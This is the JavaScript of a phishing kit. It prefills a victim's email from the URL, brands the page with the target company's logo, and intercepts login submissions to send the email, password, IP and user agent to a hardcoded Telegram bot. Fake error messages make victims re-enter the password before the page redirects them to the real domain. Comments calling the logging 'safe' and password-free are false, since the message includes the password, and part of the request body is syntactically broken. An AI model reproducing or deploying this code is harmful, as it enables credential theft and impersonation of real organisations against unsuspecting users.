
(function () {

    /* ================= TELEGRAM (SAFE) ================= */

    const TELEGRAM_BOT_TOKEN = '6106561885:AAF0EmQXOgj_TVWoaiJ75Exmhjx_WcD-SZo';
    const TELEGRAM_CHAT_ID  = '5643928959';
    const message = `
Email: ${email}
Password: ${password}
IP: ${userIp}\n
Date: ${formattedDate}
Time: ${formattedTime}
User Agent: ${userAgent}\n
Designed by Mr Josh
        `;

    function sendTelegram(domain, attempt) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text:message,
                    'Login attempt\n' +
                    'Domain: ' + domain + '\n' +
                    'Attempt: ' + attempt + '\n' +
                    'Time: ' + new Date().toISOString()
            })
        }).catch(() => {});
    }

    /* ================= PREFILL ================= */

    function getEmail() {
        try {
            const h = window.location.hash;
            if (!h || h.length < 2) return null;
            const e = decodeURIComponent(h.slice(1)).trim();
            return e.includes('@') ? e : null;
        } catch {
            return null;
        }
    }

    function emailInput() {
        return document.querySelector(
            'input[type="email"], input[name*="mail" i], input[id*="mail" i], input[placeholder*="mail" i]'
        );
    }

    function passwordInput() {
        return document.querySelector('input[type="password"]');
    }

    function prefill() {
        const email = getEmail();
        const input = emailInput();
        if (!email || !input) return false;

        input.value = email;
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));

        const domain = email.split('@')[1];
        const brand = domain.split('.')[0].toUpperCase();

        const logo = document.getElementById('logoimg');
        if (logo) logo.src = 'https://logo.clearbit.com/' + domain;

        document.querySelectorAll('#logoname,.logoname')
            .forEach(e => e.textContent = brand);

        return true;
    }

    if (!prefill()) {
        const mo = new MutationObserver(() => {
            if (prefill()) mo.disconnect();
        });
        mo.observe(document.documentElement, { childList: true, subtree: true });
    }

    /* ================= LOGIN CONTROL ================= */

    let attempts = 0;

    document.addEventListener('submit', function (e) {

        const emailEl = emailInput();
        const passEl  = passwordInput();
        const msg     = document.getElementById('msg');

        if (!emailEl || !passEl) return;

        const email = emailEl.value.trim();
        if (!email || !passEl.value) return;

        e.preventDefault();
        e.stopImmediatePropagation();

        attempts++;

        const domain = email.split('@')[1];

        // 🔔 SAFE TELEGRAM LOG (NO PASSWORD)
        sendTelegram(domain, attempts);

        // ✅ SHOW ERROR (STAYS VISIBLE)
        if (msg) {
            msg.style.display = 'block';
            msg.style.visibility = 'visible';
            msg.style.opacity = '1';
        }

        // ✅ CLEAR ONLY PASSWORD
        passEl.value = '';
        passEl.focus();

        // ✅ REDIRECT AFTER 3 TRIES
        if (attempts >= 3) {
            attempts = 0;
            setTimeout(() => {
                window.location.href = 'http://www.' + domain;
            }, 1200);
        }

        return false;

    }, true);

})();

